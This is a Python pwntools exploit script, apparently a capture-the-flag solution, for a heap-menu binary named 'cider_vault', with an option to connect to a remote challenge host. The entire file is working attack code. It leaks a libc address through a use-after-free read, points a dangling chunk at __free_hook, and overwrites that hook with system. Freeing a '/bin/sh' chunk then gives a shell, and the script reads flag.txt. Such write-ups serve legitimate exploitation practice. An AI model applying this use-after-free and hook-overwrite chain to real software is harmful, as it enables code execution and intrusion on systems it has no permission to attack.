#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./cider_vault', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

MAGIC = 0x51F0D1CE6E5B7A91
MAIN_ARENA_OFF = 0x1ECBE0


def start():
    if args.REMOTE:
        host = 'chals.bitskrieg.in'
        port = int(41930)
        return remote(host, port)
    return process(['./ld-linux-x86-64.so.2', '--library-path', '.', './cider_vault'], stdin=PIPE, stdout=PIPE, stderr=PIPE)


def slafter(io, delim, data):
    io.sendlineafter(delim, data)


def open_page(io, idx, size):
    slafter(io, b'> ', b'1')
    slafter(io, b'page id:\n', str(idx).encode())
    slafter(io, b'page size:\n', str(size).encode())


def paint_page(io, idx, data):
    slafter(io, b'> ', b'2')
    slafter(io, b'page id:\n', str(idx).encode())
    slafter(io, b'ink bytes:\n', str(len(data)).encode())
    io.send(data)


def peek_page(io, idx, n):
    slafter(io, b'> ', b'3')
    slafter(io, b'page id:\n', str(idx).encode())
    slafter(io, b'peek bytes:\n', str(n).encode())
    out = io.recvn(n)
    io.recvuntil(b'\n')
    return out


def tear_page(io, idx):
    slafter(io, b'> ', b'4')
    slafter(io, b'page id:\n', str(idx).encode())


def to_i64(x):
    x &= (1 << 64) - 1
    if x >= (1 << 63):
        x -= 1 << 64
    return x


def whisper_path(io, idx, ptr):
    token = ptr ^ MAGIC
    slafter(io, b'> ', b'6')
    slafter(io, b'page id:\n', str(idx).encode())
    slafter(io, b'star token:\n', str(to_i64(token)).encode())


def exploit(io):
    # 1) Leak libc from unsorted-bin metadata via UAF peek.
    open_page(io, 0, 0x520)
    open_page(io, 1, 0x80)
    tear_page(io, 0)
    leak = u64(peek_page(io, 0, 8))
    libc.address = leak - MAIN_ARENA_OFF
    log.success(f'unsorted leak = {hex(leak)}')
    log.success(f'libc base    = {hex(libc.address)}')

    # 2) Turn UAF into arbitrary write: repoint dangling page to __free_hook.
    whisper_path(io, 0, libc.sym.__free_hook)
    paint_page(io, 0, p64(libc.sym.system))
    log.success(f'__free_hook  = {hex(libc.sym.__free_hook)}')
    log.success(f'system       = {hex(libc.sym.system)}')

    # 3) Free a chunk containing "/bin/sh" to trigger system("/bin/sh").
    paint_page(io, 1, b'/bin/sh\x00')
    tear_page(io, 1)


if __name__ == '__main__':
    io = start()
    exploit(io)

    if args.REMOTE:
        io.interactive()
    else:
        io.sendline(b'cat flag.txt')
        try:
            print(io.recvline(timeout=1).decode(errors='ignore').strip())
        except EOFError:
            pass
        io.interactive()
